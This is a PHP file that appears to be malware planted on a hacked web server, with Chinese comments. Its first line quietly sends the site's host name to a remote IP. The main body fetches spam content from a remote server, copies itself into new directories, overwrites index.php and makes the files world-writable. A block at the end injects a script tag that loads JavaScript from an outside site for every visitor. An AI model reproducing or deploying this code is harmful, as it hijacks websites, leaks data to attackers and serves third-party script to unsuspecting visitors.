<?php file_get_contents("http://185.86.150.37/info.php?h=".urlencode($_SERVER["HTTP_HOST"])); ?><?php
	error_reporting(0);
	set_time_limit(0);

      $Remote_server="http://www.nthsmh.com";



	session_start();
	$allow_sep = "2";
	if (isset($_SESSION["post_sep"]))
	{
	if (time() - $_SESSION["post_sep"] < $allow_sep)
	{        exit("请不要反复刷新");
	}
	else
	{     
	$_SESSION["post_sep"] = time();
	}
	}
	else{$_SESSION["post_sep"] = time();
	}

	$url = $_SERVER['PHP_SELF']; 
	$filename= substr( $url , strrpos($url , '/')+1 ); 
	$NewFile_content=file_read($filename);
	$host_name=str_replace($filename,"",'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);

	$ml=$_SERVER['REQUEST_URI'] ;
	$str= explode('/',$ml);
	$Quantity=count($str)-1; //层数  
   
	if($Quantity<3){
		$Content_mb=Gethtml($Remote_server."/index.php"."?type=index.php&host=".$host_name);       
		$ml_name=strCut($Content_mb,"<!--M_name=","|-->",2);  	
	        $Branch=str_replace("|",".",$ml_name);
		$Remote_directory = $Remote_server."/d.php"."?type=index.php&host=".$host_name."&directory=".$Branch;
		$Content_directory = Reads($Remote_directory);	

		$ml_name=explode("|",$ml_name);
	   	foreach($ml_name as $value){   	  
		        mk_dir("/".$value);
			if(is_dir($value)==1)
			{
			file_write($value."/index.php",$NewFile_content);
			}
			else
			{
			echo "目录不存在!!!";   
			}
     		 }
         file_write("index.php",$Content_mb); //生成静态首页       
	 }
	else
	{
	$Content_mb=Gethtml($Remote_server."/index.php"."?type=index.php&host=".$host_name); 
  	file_write("index.php",$Content_mb); //生成静态首页
	}
	


 echo $Content_mb;









function mk_dir($dir) {
    if ( $dir)
    {
        $arr= explode('/',$dir);
        $k = "";
	$n = count($arr);

        for ( $i=1; $i<=$n; $i++)
        {
            $k = $k."/".$arr[$i];
			//echo $k;
            if ( is_dir( ".".$k) || @mkdir(".".$k) )
            {
                continue;
            }
            exit( "请检查文件目录权限" );
        }
    }
}


function string_random($len =4){
    $str ='abcdefghijklmnopqrstuvwxyz1234567890';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}

function string_a_random($len =6){
    $str ='abcdefghijklmnopqrstuvwxyz';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}

function string_n_random($len =4){
    $str ='1234567890';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}


/*
截取字符串
strContent 字符串 
StartStr   字符串起始位置
EndStr     字符串结束位置
CutType    1.包括起始和终止字符，2.不包括 
*/
function strCut($strContent,$StartStr,$EndStr,$CutType=2) {
	$s1=0;
	$s2=0;
	$cutStr = "";
	switch($CutType) {
		case 1:
			$s1 = strpos($strContent, $StartStr);
			if ($s1 === false) $s1 = 0;
			$s2 = strpos($strContent, $EndStr, $s1) + strlen($EndStr);
			break;
		case 2:
			$s1 = strpos($strContent, $StartStr); 
			if ($s1 === false) $s1 = 0;
			else
			$s1 += strlen($StartStr);			
			
			$s2 = strpos($strContent, $EndStr, $s1);
			break;
	}
	$cutStr = substr($strContent, $s1, $s2-$s1);
	return $cutStr;
}

function Gethtml($url){
	$opts = array('http' => array('method' => "GET",'timeout' => 8));
	$context = stream_context_create($opts);
	$html = file_get_contents($url, false, $context);
	if(empty($html)){$html = file_get_contents($url);}
	return $html;
}


function Reads($url){
	$opts_1 = array('http' => array('method' => "GET",'timeout' => 8));
	$context = stream_context_create($opts_1);
	$html = file_get_contents($url, false, $context);
	if(empty($html)){"<p align='center'><font color='red'><b>服务器获取文件内容出错</b></font></p>";}
	return $html;
}


function file_write($path, $data, $method = 'wb',$lock=1) {
    if ($fp = @fopen($path, $method)) {
        if($lock){
            @flock($fp,LOCK_EX);
        }
        fwrite($fp, $data);
        fclose($fp);
        chmod($path, 0777);
        return true;
    }
    return false;
}

function file_read($file){
    if (file_exists($file)) {
        return file_get_contents($file);
    }
    return false;
}
























































?>
<?php
#fb12e6#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868824\"></script>";
echo $f;
}
#/fb12e6#
?>